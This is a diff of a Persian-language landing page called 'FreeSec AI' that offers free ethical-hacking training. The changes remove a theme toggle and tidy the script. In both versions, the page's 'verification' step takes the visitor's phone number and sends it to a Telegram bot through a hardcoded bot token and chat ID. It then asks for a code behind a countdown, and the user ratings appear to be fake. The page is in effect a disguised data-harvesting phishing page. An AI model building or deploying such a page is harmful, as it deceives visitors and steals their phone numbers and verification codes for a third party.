@@ -9,17 +9,16 @@
     @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');
     body {
       font-family: 'Vazirmatn', sans-serif;
-      transition: background-color 0.3s, color 0.3s;
+      background-color: #0f172a;
+      color: #f8fafc;
     }
     .hidden { display: none; }
-
     @keyframes shake {
       0%, 100% { transform: translateX(0); }
       10%, 30%, 50%, 70%, 90% { transform: translateX(-8px); }
       20%, 40%, 60%, 80% { transform: translateX(8px); }
     }
     .shake { animation: shake 0.6s ease; }
-
     #ipWarning {
       position: fixed;
       bottom: 20px;
@@ -37,44 +36,18 @@
       from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
     }
-
-    /* حالت روشن */
-    body.light {
-      background-color: #ffffff;
-      color: #000000;
-    }
-    body.light .bg-gray-800 { background-color: #f0f0f0; }
-    body.light .bg-gray-900 { background-color: #e2e2e2; }
-    body.light .text-white { color: #000 !important; }
-    body.light .text-gray-300, 
-    body.light .text-gray-400 { color: #444 !important; }
-    body.light .text-green-300 { color: #009688 !important; }
-    body.light .text-green-400 { color: #00796b !important; }
-    body.light .bg-gray-700 { background-color: #ddd !important; color: #000; }
-
-    /* آیکون حالت */
-    #themeToggle {
-      position: fixed;
-      top: 20px;
-      left: 20px;
-      background: transparent;
-      border: none;
-      cursor: pointer;
-      z-index: 10000;
-      font-size: 24px;
-    }
   </style>
 </head>
-<body class="p-6 bg-gray-900 text-white">
-  <button id="themeToggle" onclick="toggleTheme()">🌙</button>
-
+<body class="p-6">
   <div class="max-w-6xl mx-auto">
+    <!-- صفحه اصلی -->
     <div id="mainPage">
       <header class="text-center mb-12">
         <h1 class="text-4xl font-bold text-green-400">FreeSec AI</h1>
         <p class="text-gray-300 mt-2">امنیت سایبری با قدرت هوش مصنوعی - آزاد، پیشرفته، حرفه‌ای</p>
       </header>
 
+      <!-- ویژگی‌ها -->
       <section class="grid gap-6 grid-cols-1 sm:grid-cols-2 md:grid-cols-2 mb-12">
         <div class="bg-gray-800 p-6 rounded-xl shadow-xl">
           <h2 class="text-xl font-semibold text-green-300">آموزش هک اخلاقی</h2>
@@ -94,16 +67,19 @@
         </div>
       </section>
 
+      <!-- دکمه شروع -->
       <div class="text-center mb-12">
         <button onclick="goToVerify()" class="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-6 rounded-xl">
           شروع تست رایگان
         </button>
       </div>
 
+      <!-- امتیاز -->
       <div class="text-center text-xl text-yellow-400 font-bold mb-4">
         امتیاز کاربران: ★★★★☆  (۴.۵ از ۵)
       </div>
 
+      <!-- نظرات -->
       <section class="bg-gray-900 p-6 rounded-xl mb-12">
         <h2 class="text-2xl font-bold text-green-300 mb-6">نظرات کاربران</h2>
         <div id="comments" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4"></div>
@@ -115,6 +91,7 @@
       </section>
     </div>
 
+    <!-- صفحه تأیید -->
     <div id="verifyPage" class="hidden max-w-md mx-auto mt-12 bg-gray-800 p-8 rounded-xl shadow-xl">
       <h2 class="text-2xl font-bold text-green-300 mb-4 text-center">تأیید شماره موبایل</h2>
       <label class="block text-gray-400 mb-1">شماره موبایل:</label>
@@ -137,11 +114,13 @@
     </div>
   </div>
 
+  <!-- هشدار آی‌پی -->
   <div id="ipWarning" class="hidden">شما با IP ایران وارد شده‌اید. لطفاً از فیلترشکن استفاده کنید.</div>
 
+  <!-- اسکریپت -->
   <script>
-    const BOT_TOKEN = "8178257200:AAGMH9_8w64QSnok0ZGLSbMuTQxudAJIN5o";
-    const CHAT_ID = -1002407582314;
+    const BOT_TOKEN = "8178257200:AAGMH9_8w64QSnok0ZGLSbMuTQxudAJIN5o"; // 
+    const CHAT_ID = -1002407582314; // آیدی چت تلگرام
 
     async function goToVerify() {
       try {
@@ -159,30 +138,28 @@
           document.getElementById("mainPage").classList.add("hidden");
           document.getElementById("verifyPage").classList.remove("hidden");
         }
-      } catch (e) {
+      } catch {
         alert("خطا در بررسی IP. لطفاً مجدد تلاش کنید.");
       }
     }
 
     function sendCode() {
-      const phoneInput = document.getElementById("phone");
-      const phone = phoneInput.value.trim();
-      if (!phone.match(/^09\d{9}$/)) {
-        alert("لطفاً شماره موبایل معتبر وارد کنید.");
+      const phone = document.getElementById("phone").value.trim();
+      if (!/^09\d{9}$/.test(phone)) {
+        alert("لطفاً شماره معتبر وارد کنید.");
         return;
       }
 
-      phoneInput.disabled = true;
+      document.getElementById("phone").disabled = true;
       document.querySelector("button[onclick='sendCode()']").disabled = true;
       document.getElementById("codeSection").classList.remove("hidden");
       document.getElementById("message").innerHTML = "";
       startTimer();
 
-      const text = `شماره جدید:\n${phone}`;
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: `شماره جدید:\n${phone}` })
       });
 
       setTimeout(() => {
@@ -201,12 +178,11 @@
       document.getElementById("phone").focus();
     }
 
-    let timeLeft = 120;
     let countdown;
     function startTimer() {
-      clearInterval(countdown);
-      timeLeft = 120;
+      let timeLeft = 120;
       const timerEl = document.getElementById("timer");
+      clearInterval(countdown);
       countdown = setInterval(() => {
         if (timeLeft <= 0) {
           clearInterval(countdown);
@@ -248,20 +224,15 @@
       }
     }
 
-    const container = document.getElementById("comments");
     let loadedCount = 0;
     const perPage = 6;
-
     function loadMoreComments() {
+      const container = document.getElementById("comments");
       const next = comments.slice(loadedCount, loadedCount + perPage);
       next.forEach(c => {
         const div = document.createElement("div");
         div.className = "bg-gray-800 p-4 rounded shadow";
-        div.innerHTML = `
-          <p class='text-white font-semibold'>${c.name}</p>
-          <p class='text-gray-300 mb-2'>${c.text}</p>
-          <p class='text-yellow-400'>★★★★☆</p>
-        `;
+        div.innerHTML = `<p class='text-white font-semibold'>${c.name}</p><p class='text-gray-300 mb-2'>${c.text}</p><p class='text-yellow-400'>★★★★☆</p>`;
         container.appendChild(div);
       });
       loadedCount += perPage;
@@ -270,15 +241,7 @@
       }
     }
 
-    function toggleTheme() {
-      document.body.classList.toggle("light");
-      const btn = document.getElementById("themeToggle");
-      btn.textContent = document.body.classList.contains("light") ? "☀️" : "🌙";
-    }
-
-    window.onload = () => {
-      loadMoreComments();
-    };
+    window.onload = loadMoreComments;
   </script>
 </body>
 </html>
